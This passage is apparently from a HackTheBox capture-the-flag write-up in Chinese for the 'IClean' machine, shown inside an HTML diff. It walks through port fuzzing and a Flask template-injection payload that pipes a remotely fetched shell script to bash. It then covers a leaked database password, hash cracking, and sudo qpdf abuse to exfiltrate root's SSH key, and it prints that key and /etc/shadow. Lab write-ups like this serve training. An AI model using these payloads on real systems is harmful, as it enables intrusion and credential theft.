session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZhGcTg.DUuCCZWbCSHovP356XNogR5yD5A</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">invoice_id=0278834419&amp;form_type=scannable_invoice&amp;qr_link=http://capiclean.htb:FUZZ</span><br></pre></td></tr></table></figure>
+
+<p>隨手做一個 1到65536的字典然後 ffuf：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">for</span> x <span class="keyword">in</span> &#123;1..65535&#125; ; <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">$x</span> &gt;&gt; port.txt; <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">$ ffuf -request ffuf_qr_port -request-proto http -w port.txt -<span class="built_in">fc</span> 500</span><br><span class="line">[Status: 200, Size: 26658, Words: 1315, Lines: 106, Duration: 691ms]</span><br><span class="line">    * FUZZ: 80</span><br><span class="line"></span><br><span class="line">[Status: 200, Size: 26658, Words: 1315, Lines: 106, Duration: 307ms]</span><br><span class="line">    * FUZZ: 3000</span><br><span class="line"></span><br><span class="line">[Status: 200, Size: 4478, Words: 1315, Lines: 106, Duration: 497ms]</span><br><span class="line">    * FUZZ: 40471</span><br><span class="line"></span><br><span class="line">:: Progress: [65535/65535] :: Job [1/1] :: 66 req/sec :: Duration: [0:16:41] :: Errors: 0 ::</span><br></pre></td></tr></table></figure>
+
+<p>對服務器隨便寫點東西可以看出來是apache</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-OQkDqvIqsjtDodk0-IClean/image-20240407164131-lqk59df.png" alt="image">​</p>
+<p>也就是說 80 是apache2， 3000 是python 的服務器，還有一個 40471 暫時不知道是什麽。</p>
+<h2 id="0x4-Flask-SSTI-to-webshell"><a href="#0x4-Flask-SSTI-to-webshell" class="headerlink" title="0x4 Flask SSTI to webshell"></a>0x4 Flask SSTI to webshell</h2><p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-OQkDqvIqsjtDodk0-IClean/image-20240407164252-zxxr6e1.png" alt="image">​</p>
+<p>後來發現，是我想太多了，隨便找一個payload就得到了RCE：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoice_id=&amp;form_type=scannable_invoice&amp;qr_link=&#123;&#123;request[<span class="string">&#x27;application&#x27;</span>][<span class="string">&#x27;\x5f\x5fglobals\x5f\x5f&#x27;</span>][<span class="string">&#x27;\x5f\x5fbuiltins\x5f\x5f&#x27;</span>][<span class="string">&#x27;\x5f\x5fimport\x5f\x5f&#x27;</span>](<span class="string">&#x27;os&#x27;</span>)[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;curl+http://10.10.16.15:80/shell.sh|bash&#x27;</span>)[<span class="string">&#x27;read&#x27;</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然後看看有什麽用戶：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@iclean:/opt/app$ <span class="built_in">cat</span> /etc/passwd | grep sh</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">sshd:x:106:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">consuela:x:1000:1000:consuela:/home/consuela:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>只有一個用戶，意味著需要尋找 <code>consuela</code>​ 的密碼，之後看到有一個app.py</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">www-data@iclean:/opt/app$ <span class="built_in">ls</span></span><br><span class="line">app.py  static  templates</span><br><span class="line"></span><br><span class="line">www-data@iclean:/opt/app$ <span class="built_in">cat</span> app.py</span><br><span class="line"><span class="comment"># Database Configuration</span></span><br><span class="line">db_config = &#123;</span><br><span class="line">    <span class="string">&#x27;host&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;user&#x27;</span>: <span class="string">&#x27;iclean&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;pxCsmnGLckUb&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;database&#x27;</span>: <span class="string">&#x27;capiclean&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(port=3000)</span><br></pre></td></tr></table></figure>
+
+<p>看到有數據庫的密碼，使用chisel轉發一下3306，使用dbeaver打開看看裏面有什麽：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-OQkDqvIqsjtDodk0-IClean/image-20240407165712-tna90b6.png" alt="image">​</p>
+<p>有一個加密的密碼：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ nth -t <span class="string">&#x27;0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa&#x27;</span>                                                            </span><br><span class="line"></span><br><span class="line">  _   _                           _____ _           _          _   _           _   </span><br><span class="line"> | \ | |                         |_   _| |         | |        | | | |         | |  </span><br><span class="line"> |  \| | __ _ _ __ ___   ___ ______| | | |__   __ _| |_ ______| |_| | __ _ ___| |__  </span><br><span class="line"> | . ` |/ _` | <span class="string">&#x27;_ ` _ \ / _ \______| | | &#x27;</span>_ \ / _` | __|______|  _  |/ _` / __| <span class="string">&#x27;_ \ </span></span><br><span class="line"><span class="string"> | |\  | (_| | | | | | |  __/      | | | | | | (_| | |_       | | | | (_| \__ \ | | |</span></span><br><span class="line"><span class="string"> \_| \_/\__,_|_| |_| |_|\___|      \_/ |_| |_|\__,_|\__|      \_| |_/\__,_|___/_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">https://twitter.com/bee_sec_san</span></span><br><span class="line"><span class="string">https://github.com/HashPals/Name-That-Hash </span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Most Likely </span></span><br><span class="line"><span class="string">SHA-256, HC: 1400 JtR: raw-sha256 Summary: 256-bit key and is a good partner-function for AES. Can be used in Shadow files.</span></span><br><span class="line"><span class="string">Keccak-256, HC: 17800 </span></span><br><span class="line"><span class="string">Haval-128, JtR: haval-128-4</span></span><br><span class="line"><span class="string">Snefru-256, JtR: snefru-256</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Least Likely</span></span><br><span class="line"><span class="string">RIPEMD-256, JtR: dynamic_140 Haval-256 (3 rounds), JtR: dynamic_140 Haval-256 (4 rounds), JtR: dynamic_290 Haval-256 (5 rounds), JtR: dynamic_300 GOST R 34.11-94, HC: 6900 JtR: gost GOST </span></span><br><span class="line"><span class="string">CryptoPro S-Box,  Blake2b-256,  SHA3-256, HC: 17400 JtR: dynamic_380 PANAMA, JtR: dynamic_320 BLAKE2-256,  BLAKE2-384,  Skein-256, JtR: skein-256 Skein-512(256),  Ventrilo,  </span></span><br><span class="line"><span class="string">sha256($pass.$salt), HC: 1410 JtR: dynamic_62 sha256($salt.$pass), HC: 1420 JtR: dynamic_61 sha256(sha256($pass)), HC: 1420 JtR: dynamic_63 sha256(sha256_raw($pass))), HC: 1420 JtR: </span></span><br><span class="line"><span class="string">dynamic_64 sha256(sha256($pass).$salt), HC: 1420 JtR: dynamic_65 sha256($salt.sha256($pass)), HC: 1420 JtR: dynamic_66 sha256(sha256($salt).sha256($pass)), HC: 1420 JtR: dynamic_67 </span></span><br><span class="line"><span class="string">sha256(sha256($pass).sha256($pass)), HC: 1420 JtR: dynamic_68 sha256(unicode($pass).$salt), HC: 1430  sha256($salt.unicode($pass)), HC: 1440  HMAC-SHA256 (key = $pass), HC: 1450 JtR: </span></span><br><span class="line"><span class="string">hmac-sha256 HMAC-SHA256 (key = $salt), HC: 1460 JtR: hmac-sha256 Cisco Type 7,  BigCrypt, JtR: bigcrypt </span></span><br></pre></td></tr></table></figure>
+
+<p>知道是 sha256， hashcat是1400之後，使用hashcat 破解一下，得到密碼：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa:simple and clean</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x5-user-to-root"><a href="#0x5-user-to-root" class="headerlink" title="0x5 user to root"></a>0x5 user to root</h2><p>得到了密碼之後嘗試登陸看看：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">www-data@iclean:/opt/app$ su consuela</span><br><span class="line">Password: </span><br><span class="line"></span><br><span class="line">consuela@iclean:/opt/app$ <span class="built_in">whoami</span> </span><br><span class="line">consuela</span><br><span class="line"></span><br><span class="line">consuela@iclean:/opt/app$ <span class="built_in">id</span></span><br><span class="line">uid=1000(consuela) gid=1000(consuela) <span class="built_in">groups</span>=1000(consuela)</span><br><span class="line"></span><br><span class="line">consuela@iclean:/opt/app$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> consuela: </span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> consuela on iclean:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User consuela may run the following commands on iclean:</span><br><span class="line">    (ALL) /usr/bin/qpdf</span><br></pre></td></tr></table></figure>
+
+<p>這就很簡單了，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">consuela@iclean:/opt/app$ qpdf --<span class="built_in">help</span></span><br><span class="line">Run <span class="string">&quot;qpdf --help=topic&quot;</span> <span class="keyword">for</span> <span class="built_in">help</span> on a topic.</span><br><span class="line">Run <span class="string">&quot;qpdf --help=--option&quot;</span> <span class="keyword">for</span> <span class="built_in">help</span> on an option.</span><br><span class="line">Run <span class="string">&quot;qpdf --help=all&quot;</span> to see all available <span class="built_in">help</span>.</span><br><span class="line"></span><br><span class="line">Topics:</span><br><span class="line">  add-attachment: attach (embed) files</span><br><span class="line">  advanced-control: tweak qpdf<span class="string">&#x27;s behavior</span></span><br><span class="line"><span class="string">  attachments: work with embedded files</span></span><br><span class="line"><span class="string">  completion: shell completion</span></span><br><span class="line"><span class="string">  copy-attachments: copy attachments from another file</span></span><br><span class="line"><span class="string">  encryption: create encrypted files</span></span><br><span class="line"><span class="string">  exit-status: meanings of qpdf&#x27;</span>s <span class="built_in">exit</span> codes</span><br><span class="line">  general: general options</span><br><span class="line">  <span class="built_in">help</span>: information about qpdf</span><br><span class="line">  inspection: inspect PDF files</span><br><span class="line">  json: JSON output <span class="keyword">for</span> PDF information</span><br><span class="line">  modification: change parts of the PDF</span><br><span class="line">  overlay-underlay: overlay/underlay pages from other files</span><br><span class="line">  page-ranges: page range syntax</span><br><span class="line">  page-selection: <span class="keyword">select</span> pages from one or more files</span><br><span class="line">  pdf-dates: PDF <span class="built_in">date</span> format</span><br><span class="line">  testing: options <span class="keyword">for</span> testing or debugging</span><br><span class="line">  transformation: make structural PDF changes</span><br><span class="line">  usage: basic invocation</span><br><span class="line"></span><br><span class="line">For detailed <span class="built_in">help</span>, visit the qpdf manual: https://qpdf.readthedocs.io</span><br></pre></td></tr></table></figure>
+
+<p>你可以看到它可以讀取任意文件，這樣就可以使用它獲得一個root.txt，幸運的話還可以獲得 id_rsa的密碼。</p>
+<p>谷歌搜索了一下找到這篇：</p>
+<blockquote>
+<p>加入文件到pdf<br>qpdf eg1.pdf –add-attachment eg1.md – out.pdf<br>qpdf –list-attachments ..&#x2F;out.pdf</p>
+<p>從pdf提取文件<br>qpdf –show-attachment&#x3D;eg1.md ..&#x2F;out.pdf &gt; fromPDF.md<br>diff fromPDF.md ..&#x2F;eg1.md</p>
+<p><a target="_blank" rel="noopener" href="https://mattpayne.org/posts/qpdf_pandoc_carry_source/">https://mattpayne.org/posts/qpdf_pandoc_carry_source&#x2F;</a></p>
+</blockquote>
+<p>如果沒有文件可以使用 <code>--empty</code>​ 讓他創建一個空白的pdf，然後就可以：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">consuela@iclean:/opt/app$ sudo qpdf --empty --add-attachment /root/.ssh/id_rsa -- root.pdf</span><br><span class="line">consuela@iclean:/opt/app$ <span class="built_in">ls</span></span><br><span class="line">app.py  root.pdf  static  templates</span><br></pre></td></tr></table></figure>
+
+<p>然後使用一些工具傳到本地：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ qpdf --list-attachments root.pdf</span><br><span class="line">id_rsa -&gt; 5,0</span><br><span class="line">                                                                                                                                                                                        </span><br><span class="line">$ qpdf --show-attachment=id_rsa root.pdf      </span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS</span><br><span class="line">1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQQMb6Wn/o1SBLJUpiVfUaxWHAE64hBN</span><br><span class="line">vX1ZjgJ9wc9nfjEqFS+jAtTyEljTqB+DjJLtRfP4N40SdoZ9yvekRQDRAAAAqGOKt0ljir</span><br><span class="line">dJAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAxvpaf+jVIEslSm</span><br><span class="line">JV9RrFYcATriEE29fVmOAn3Bz2d+MSoVL6MC1PISWNOoH4OMku1F8/g3jRJ2hn3K96RFAN</span><br><span class="line">EAAAAgK2QvEb+leR18iSesuyvCZCW1mI+YDL7sqwb+XMiIE/4AAAALcm9vdEBpY2xlYW4B</span><br><span class="line">AgMEBQ==</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br><span class="line">                                                                                                                                                                                        </span><br><span class="line">$ qpdf --show-attachment=id_rsa root.pdf &gt; id_rsa </span><br><span class="line"></span><br><span class="line"><span class="comment"># 不修改權限是不給你連接上去的</span></span><br><span class="line">$ <span class="built_in">chmod</span> 400 id_rsa </span><br></pre></td></tr></table></figure>
+
+<p>於是就可以使用 root 進行連接了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -i id_rsa root@10.129.213.71           </span><br><span class="line">Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/pro</span><br><span class="line"></span><br><span class="line">  System information as of Sun Apr  7 09:08:02 AM UTC 2024</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Expanded Security Maintenance <span class="keyword">for</span> Applications is not enabled.</span><br><span class="line"></span><br><span class="line">3 updates can be applied immediately.</span><br><span class="line">To see these additional updates run: apt list --upgradable</span><br><span class="line"></span><br><span class="line">Enable ESM Apps to receive additional future security updates.</span><br><span class="line">See https://ubuntu.com/esm or run: sudo pro status</span><br><span class="line"></span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Sat Apr  6 21:58:07 2024 from 10.10.16.15</span><br><span class="line">root@iclean:~<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<h2 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">root@iclean:~<span class="comment"># cat /etc/shadow</span></span><br><span class="line">root:$y$j9T<span class="variable">$s0AIwd7onN6K77K5v8DNN</span>/<span class="variable">$bSd333U5BKvkfCPEGdf9dLl3bOYwqOlFNtGZ1FQQuv</span>/:19774:0:99999:7:::</span><br><span class="line">daemon:*:19579:0:99999:7:::</span><br><span class="line">bin:*:19579:0:99999:7:::</span><br><span class="line">sys:*:19579:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:19579:0:99999:7:::</span><br><span class="line">games:*:19579:0:99999:7:::</span><br><span class="line">man:*:19579:0:99999:7:::</span><br><span class="line">lp:*:19579:0:99999:7:::</span><br><span class="line">mail:*:19579:0:99999:7:::</span><br><span class="line">news:*:19579:0:99999:7:::</span><br><span class="line">uucp:*:19579:0:99999:7:::</span><br><span class="line">proxy:*:19579:0:99999:7:::</span><br><span class="line">www-data:*:19579:0:99999:7:::</span><br><span class="line">backup:*:19579:0:99999:7:::</span><br><span class="line">list:*:19579:0:99999:7:::</span><br><span class="line">irc:*:19579:0:99999:7:::</span><br><span class="line">gnats:*:19579:0:99999:7:::</span><br><span class="line">nobody:*:19579:0:99999:7:::</span><br><span class="line">_apt:*:19579:0:99999:7:::</span><br><span class="line">systemd-network:*:19579:0:99999:7:::</span><br><span class="line">systemd-resolve:*:19579:0:99999:7:::</span><br><span class="line">messagebus:*:19579:0:99999:7:::</span><br><span class="line">systemd-timesync:*:19579:0:99999:7:::</span><br><span class="line">pollinate:*:19579:0:99999:7:::</span><br><span class="line">sshd:*:19579:0:99999:7:::</span><br><span class="line">syslog:*:19579:0:99999:7:::</span><br><span class="line">uuidd:*:19579:0:99999:7:::</span><br><span class="line">tcpdump:*:19579:0:99999:7:::</span><br><span class="line">tss:*:19579:0:99999:7:::</span><br><span class="line">landscape:*:19579:0:99999:7:::</span><br><span class="line">fwupd-refresh:*:19579:0:99999:7:::</span><br><span class="line">usbmux:*:19605:0:99999:7:::</span><br><span class="line">consuela:$y$j9T<span class="variable">$kcli</span>/RCzquedZVyk0783m/<span class="variable">$8KhTzkFppH2THx1k0SuUcjSP4jFXNl6HokF4MKwFr60</span>:19605:0:99999:7:::</span><br><span class="line">lxd:!:19605::::::</span><br><span class="line">snapd-range-524288-root:!:19605::::::</span><br><span class="line">snap_daemon:!:19605::::::</span><br><span class="line">avahi:*:19605:0:99999:7:::</span><br><span class="line">geoclue:*:19605:0:99999:7:::</span><br><span class="line">mysql:!:19605:0:99999:7:::</span><br><span class="line">_laurel:!:19789::::::</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h1 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h1><p><strong>Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">If you really like my writeups, please use this link to sign up for an HTB Academy account to show my appreciation.</a></p>
+<p><strong>非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">如果你真的喜歡我寫的writeup，請使用這個鏈接注冊一個 HTB Academy 賬號，以表達我的感謝。</a></p>
+<p>如果你是新手，使用上面的鏈接加入 HTB 的 academy 就可以免費看 Tire 0 的所有教程，這對初學者來説是很友好的。 （建議先完成 INTRODUCTION TO ACADEMY）</p>
+<p>If you are a beginner, join HTB’s academy with this link to get free access to all the tutorials for Tire 0. This is very beginner friendly. (It is recommended to complete INTRODUCTION TO ACADEMY first)</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <script>
+        setTimeout(() => {
+          makeList({
+             'target': '#toc-mobile',   // Selector for element to place table of contents
+             'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+          });
+        }, 1000);
+      </script>
+    
+    <div id="toc-footer" style="display: none">
+      <div id="toc-mobile"></div>
+    </div>
+
+    <style>
+        #toc-mobile {
+        }
+        #toc-mobile ul {
+           display: grid ! important;
+        }
+        #toc-mobile li {
+           margin: 0 0 0 0 ! important;
+        }
+        #toc-mobile .level-1 {
+           color: #00b4dd ;
+        }
+        #toc-mobile .level-2 {
+           color: #2bbc8a;
+        }
+        #toc-mobile .level-3 {
+           color: #40474b;
+        }
+        #toc-mobile .level-4 .level-5 .level-6 {
+           color: #8c8c8c;
+        }
+    </style>
+
+
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/04/07/2024-htb-machine/13-IClean/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/04/07/2024-htb-machine/13-IClean/&text=HackTheBox - Machine - IClean"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/04/07/2024-htb-machine/13-IClean/&title=HackTheBox - Machine - IClean"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/04/07/2024-htb-machine/13-IClean/&is_video=false&description=HackTheBox - Machine - IClean"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - IClean&body=Check out this article: https://manesec.github.io/2024/04/07/2024-htb-machine/13-IClean/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/04/07/2024-htb-machine/13-IClean/&title=HackTheBox - Machine - IClean"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/04/07/2024-htb-machine/13-IClean/&title=HackTheBox - Machine - IClean"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/04/07/2024-htb-machine/13-IClean/&title=HackTheBox - Machine - IClean"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/04/07/2024-htb-machine/13-IClean/&title=HackTheBox - Machine - IClean"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/04/07/2024-htb-machine/13-IClean/&name=HackTheBox - Machine - IClean&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/04/07/2024-htb-machine/13-IClean/&t=HackTheBox - Machine - IClean"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+      
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+  
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    manesec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Add space -->
+<script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
